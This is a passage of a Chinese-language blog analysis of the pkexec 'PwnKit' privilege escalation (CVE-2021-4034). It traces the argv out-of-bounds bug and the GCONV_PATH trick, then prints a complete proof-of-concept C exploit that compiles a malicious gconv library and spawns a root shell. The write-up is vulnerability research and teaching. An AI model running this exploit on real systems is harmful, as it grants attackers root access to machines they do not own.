</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">610</span>   <span class="n">path</span> <span class="o">=</span> <span class="n">g_strdup</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">n</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">629</span>   <span class="k">if</span> <span class="p">(</span><span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">630</span>     <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">632</span>       <span class="n">s</span> <span class="o">=</span> <span class="n">g_find_program_in_path</span> <span class="p">(</span><span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">639</span>       <span class="n">argv</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">640</span>     <span class="p">}</span>
</span></span></code></pre></div><p>其中有两个 glib 提供的函数 <a href="https://www.manpagez.com/html/glib/glib-2.56.0/glib-String-Utility-Functions.php#g-strdup" target="_blank" rel="noopener noreffer">g_strdup()</a> 和 <a href="https://docs.gtk.org/glib/func.find_program_in_path.html" target="_blank" rel="noopener noreffer">g_find_program_in_path()</a> ，先熟悉一下：</p>
<blockquote>
<ul>
<li><code>g_strdup()</code> 复制一个字符串，声明如下：</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">gchar</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">g_strdup</span> <span class="p">(</span><span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">str</span><span class="p">);</span>
</span></span></code></pre></div><ul>
<li><code>g_find_program_in_path()</code> 在用户路径中定位第一个名为 program 的可执行程序，与 execvp() 定位它的方式相同。返回具有绝对路径名的已分配字符串，如果在路径中找不到程序，则返回 NULL。如果 program 已经是绝对路径，且如果 program 存在并且可执行，则返回 program 的副本，否则返回 NULL。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">gchar</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">g_find_program_in_path</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="n">gchar</span><span class="o">*</span> <span class="n">program</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></div></blockquote>
<p>再看 main() 函数中：</p>
<ul>
<li>L534-L568，用来处理命令行参数
<ul>
<li>L534：n=1，当 argc=1 时，不会进入循环，比如：<code>pkexec</code>；当 argc&gt;1时，才会进入循环，比如：<code>pkexec --version</code></li>
</ul>
</li>
<li>L610-L640，如果其路径不是绝对路径,会在 PATH 中搜索要执行的程序
<ul>
<li>L610：使用 <code>g_strdup()</code> 复制 <code>argv[n]</code> 的内容到 <code>path</code>，因为在 <code>pkexec</code> 中 <code>argv[n]</code> 就是目标路径，比如：<code>pkexec reboot</code></li>
<li>L629：这里判断是否是绝对路径的方法比较巧妙，使用 <code>path[0] != '/'</code> 来判断</li>
<li>L632：检索目标路径，返回目标路径字符串</li>
<li>L639：将返回的路径赋值给 <code>path</code> 和 <code>argv[n]</code></li>
</ul>
</li>
</ul>
<p>正常情况下，这样处理的逻辑没有问题。
但如果命令行参数 argc 为 0，则会出现意外情况：</p>
<ul>
<li>L534，n 永久设置为 1；</li>
<li>L610，<code>argv[1]</code> 发生越界读取，并把越界读取到的值赋给了 <code>path</code>；</li>
<li>L639，指针 s 被越界写入 <code>argv[1]</code>。</li>
</ul>
<p>问题在于，这个越界的 <code>argv[1]</code> 中读取和写入的是什么？</p>
<p>我们需要先了解参数的内存布局，结合内核代码来分析：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// linux5.4/fs/binfmt_elf.c:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">163</span> <span class="k">static</span> <span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="mi">164</span> <span class="nf">create_elf_tables</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">elfhdr</span> <span class="o">*</span><span class="n">exec</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mi">165</span>         <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">load_addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">interp_load_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">166</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">284</span>     <span class="n">sp</span> <span class="o">=</span> <span class="n">STACK_ADD</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">ei_index</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// 布局 main 函数栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">306</span>     <span class="cm">/* Now, let&#39;s put argc (and argv, envp if appropriate) on the stack */</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// argc 入栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">307</span>     <span class="k">if</span> <span class="p">(</span><span class="n">__put_user</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">sp</span><span class="o">++</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">308</span>         <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">309</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// argv 入栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">310</span>     <span class="cm">/* Populate list of argv pointers back to argv strings. */</span>
</span></span><span class="line"><span class="cl"><span class="mi">311</span>     <span class="n">p</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">arg_end</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">arg_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">312</span>     <span class="k">while</span> <span class="p">(</span><span class="n">argc</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">313</span>         <span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">314</span>         <span class="k">if</span> <span class="p">(</span><span class="n">__put_user</span><span class="p">((</span><span class="n">elf_addr_t</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="n">sp</span><span class="o">++</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">315</span>             <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">316</span>         <span class="n">len</span> <span class="o">=</span> <span class="n">strnlen_user</span><span class="p">((</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="n">MAX_ARG_STRLEN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">317</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span> <span class="o">||</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">MAX_ARG_STRLEN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">318</span>             <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">319</span>         <span class="n">p</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">320</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// argv null 入栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">321</span>     <span class="k">if</span> <span class="p">(</span><span class="n">__put_user</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">sp</span><span class="o">++</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">322</span>         <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">323</span>     <span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">arg_end</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">324</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// env 入栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">325</span>     <span class="cm">/* Populate list of envp pointers back to envp strings. */</span>
</span></span><span class="line"><span class="cl"><span class="mi">326</span>     <span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">env_end</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="o">-&gt;</span><span class="n">env_start</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">327</span>     <span class="k">while</span> <span class="p">(</span><span class="n">envc</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">328</span>         <span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">329</span>         <span class="k">if</span> <span class="p">(</span><span class="n">__put_user</span><span class="p">((</span><span class="n">elf_addr_t</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="n">sp</span><span class="o">++</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">330</span>             <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">331</span>         <span class="n">len</span> <span class="o">=</span> <span class="n">strnlen_user</span><span class="p">((</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">,</span> <span class="n">MAX_ARG_STRLEN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">332</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span> <span class="o">||</span> <span class="n">len</span> <span class="o">&gt;</span> <span class="n">MAX_ARG_STRLEN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">333</span>             <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">334</span>         <span class="n">p</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">335</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// env null 入栈
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">336</span>     <span class="k">if</span> <span class="p">(</span><span class="n">__put_user</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">sp</span><span class="o">++</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="mi">337</span>         <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>\
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>从代码中可以看出，当 execve() 一个新程序时，内核将参数、环境字符串和指针（argv 和 envp）复制到新程序堆栈的末尾，main 函数参数是布局在栈上，argc、argv依次入栈（L307、L321），后面紧接着就是 env 入栈（L325-L336）。
把上面的代码简化成下面的图示：</p>
<pre tabindex="0"><code>|---------+---------+-----+------------|---------+---------+-----+------------|
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
     V         V                V           V         V                V
 &#34;program&#34; &#34;-option&#34;           NULL      &#34;value&#34; &#34;PATH=name&#34;          NULL
</code></pre><p>可以发现 argv 和 envp 指针在内存中是连续的，如果 argc 为 0，那么越界 argv[1] 实际上是 <code>envp[0]</code>，指向第一个环境变量 <code>value</code> 的指针。</p>
<p>argv[1] 是什么解决了，那再回过来看 pkexec 的 main() 函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">435</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="mi">436</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">534</span>   <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">guint</span><span class="p">)</span> <span class="n">argc</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">535</span>     <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">568</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">610</span>   <span class="n">path</span> <span class="o">=</span> <span class="n">g_strdup</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">n</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">629</span>   <span class="k">if</span> <span class="p">(</span><span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">630</span>     <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">632</span>       <span class="n">s</span> <span class="o">=</span> <span class="n">g_find_program_in_path</span> <span class="p">(</span><span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">639</span>       <span class="n">argv</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">640</span>     <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>L610，要执行的程序的路径从 argv[1]（即 <code>envp[0]</code>）越界读取，并指向 <code>value</code></li>
<li>L632，这个路径 <code>value</code> 被传递给 <code>g_find_program_in_path()</code></li>
<li><code>g_find_program_in_path()</code> 会在 PATH 环境变量的目录中搜索一个名为 <code>value</code> 的可执行文件</li>
<li>如果找到这样的可执行文件，则将其完整路径返回给 pkexec 的 main() 函数（L632）</li>
<li>最后，L639，这个完整路径被越界写入 argv[1]（即 <code>envp[0]</code>），覆盖了第一个环境变量。</li>
</ul>
<p>因此只要能控制 <code>g_find_program_in_path</code> 返回的字符串，就可以注入任意的环境变量。</p>
<p>Qualys <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener noreffer">指出</a>如果 PATH 环境变量是 <code>PATH=name</code>，并且目录 <code>name</code> 存在（在当前工作目录中）并且包含一个名为 <code>value</code> 的可执行文件，则写入一个指向字符串 <code>name/value</code> 的指针越界到 <code>envp[0]</code>。</p>
<p>进一步，让这个组合的文件名里包含等号 &ldquo;=&quot;。传入 <code>PATH=name=.</code> ，创建一个 <code>name=.</code> 目录，并在其中放一个可执行文件 <code>value</code>，最终 <code>envp[0]</code> 就会被篡改为 <code>name=./value</code>，也就是注入了一个新的环境变量进去。</p>
<p>换句话说，这种越界写入可以绕过原有的安全检查，将不安全的环境变量（例如，LD_PRELOAD）重新引入 pkexec 的环境。</p>
<h3 id="寻找不安全的环境变量">寻找不安全的环境变量</h3>
<p>新的问题是：要成功利用这个漏洞，应该将哪个不安全变量重新引入 pkexec 的环境中？我们的选择是有限的，因为在越界写入后不久（L639），pkexec 完全清除了它的环境（L702）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"> <span class="mi">639</span>       <span class="n">argv</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">657</span>   <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environment_variables_to_save</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">658</span>     <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="mi">659</span>       <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">environment_variables_to_save</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">662</span>       <span class="n">value</span> <span class="o">=</span> <span class="n">g_getenv</span> <span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">670</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">validate_environment_variable</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">675</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">702</span>   <span class="k">if</span> <span class="p">(</span><span class="n">clearenv</span> <span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>答案来自于 pkexec 的复杂性：为了向 stderr 打印错误消息，pkexec 调用 GLib 的函数 <code>g_printerr()</code>（注意：GLib 是 GNOME 库，而不是 GNU C 库，即 glibc）；例如，函数 <code>validate_environment_variable()</code> 和 <code>log_message()</code> 调用 <code>g_printerr()</code> （L126，L408-L409）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="mi">88</span> <span class="nf">log_message</span> <span class="p">(</span><span class="n">gint</span>     <span class="n">level</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mi">89</span>              <span class="n">gboolean</span> <span class="n">print_to_stderr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mi">90</span>              <span class="k">const</span>    <span class="n">gchar</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mi">91</span>              <span class="p">...)</span>
</span></span><span class="line"><span class="cl">  <span class="mi">92</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">125</span>   <span class="k">if</span> <span class="p">(</span><span class="n">print_to_stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">126</span>     <span class="n">g_printerr</span> <span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">------------------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"> <span class="mi">383</span> <span class="n">validate_environment_variable</span> <span class="p">(</span><span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="mi">384</span>                                <span class="k">const</span> <span class="n">gchar</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">385</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="mi">406</span>           <span class="n">log_message</span> <span class="p">(</span><span class="n">LOG_CRIT</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="mi">407</span>                        <span class="s">&#34;The value for the SHELL variable was not found the /etc/shells file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">408</span>           <span class="n">g_printerr</span> <span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">409</span>                       <span class="s">&#34;This incident has been reported.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p><code>g_printerr()</code> 通常打印 UTF-8 错误消息，但如果环境变量 CHARSET 不是 UTF-8，它可以打印另一个字符集中的消息（注意：CHARSET 不是安全敏感的，它不是不安全的环境变量）。</p>
<p>要将消息从 UTF-8 转换为另一个字符集，<code>g_printerr()</code> 调用 glibc 的函数 <code>iconv_open()</code>。</p>
<p>要将消息从一个字符集转换为另一个字符集，<code>iconv_open()</code> 执行小型共享库；通常，这些三元组（“from”字符集、“to”字符集和库名称）是从默认配置文件 <code>/usr/lib/gconv/gconv-modules</code> 中读取的。但环境变量 <code>GCONV_PATH</code> 可以强制 <code>iconv_open()</code> 读取另一个配置文件；所以 <code>GCONV_PATH</code> 是不安全的环境变量之一（因为它会导致执行任意库），因此会被 ld.so 从 SUID 程序的环境中删除。</p>
<p>我们可以把 <code>GCONV_PATH</code> 重新引入 pkexec 的环境，并以 root 身份执行我们自己的共享库。</p>
<h3 id="回顾-poc">回顾 POC</h3>
<p>现在我们对漏洞原理有了更深的认识，再看一看 POC</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="mi">1</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">2</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">3</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4</span> 
</span></span><span class="line"><span class="cl">  <span class="mi">5</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="mi">6</span>         <span class="s">&#34;#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">7</span>         <span class="s">&#34;#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">8</span>         <span class="s">&#34;#include &lt;unistd.h&gt;</span><span class="se">\n\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">9</span>         <span class="s">&#34;void gconv() {}</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">10</span>         <span class="s">&#34;void gconv_init() {</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">11</span>         <span class="s">&#34;       setuid(0); setgid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">12</span>         <span class="s">&#34;       seteuid(0); setegid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">13</span>         <span class="s">&#34;       system(</span><span class="se">\&#34;</span><span class="s">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh</span><span class="se">\&#34;</span><span class="s">);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">14</span>         <span class="s">&#34;       exit(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">15</span>         <span class="s">&#34;}&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">16</span>         
</span></span><span class="line"><span class="cl"> <span class="mi">17</span> <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="mi">18</span>         <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">19</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">20</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">21</span>         <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;pwnkit/pwnkit.c&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">22</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">23</span>         <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"> <span class="mi">24</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">25</span>         <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;pwnkit&#34;</span><span class="p">,</span> <span class="s">&#34;PATH=GCONV_PATH=.&#34;</span><span class="p">,</span> <span class="s">&#34;CHARSET=PWNKIT&#34;</span><span class="p">,</span> <span class="s">&#34;SHELL=pwnkit&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"> <span class="mi">26</span>         <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/usr/bin/pkexec&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">[]){</span><span class="nb">NULL</span><span class="p">},</span> <span class="n">env</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">27</span> <span class="p">}</span> 
</span></span></code></pre></div><p>需要新注意的是：</p>
<ol>
<li>L26，使用 <code>execve</code> 调用 <code>pkexec</code>，<code>(char*[]){NULL}</code>造成 <code>argv[1]</code> 越界读取</li>
<li>L25，一个特殊的数组，env[0]为 payload，env[1]引入了<code>GCONV_PATH</code></li>
<li>L20，设置非UTF-8环境，也就导致 payload 中 <code>gconv_init</code> 执行，造成 <code>/bin/sh</code> 执行，恢复环境变量得到 root shell。</li>
</ol>
<h2 id="0x03-漏洞总结">0x03 漏洞总结</h2>
<p>总结一下该漏洞的利用思路：</p>
<ol>
<li>通过设置 <code>execve()</code> 的 argv[] 为零，造成 argv[1] 越界读取，并绕过安全检查</li>
<li>通过 <code>g_printerr</code> 函数发现可控的不安全环境变量 <code>GCONV_PATH</code></li>
<li>构造畸形的路径使 <code>pkexec</code> 从指定路径读取环境变量完成提权</li>
</ol>
<p>这个漏洞的质量非常好，利用思路也很有趣，借用一下 Qualys 对该漏洞的<a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener noreffer">评价</a>：</p>
<blockquote>
<p>这个漏洞是攻击者的梦想成真。</p>
<ul>
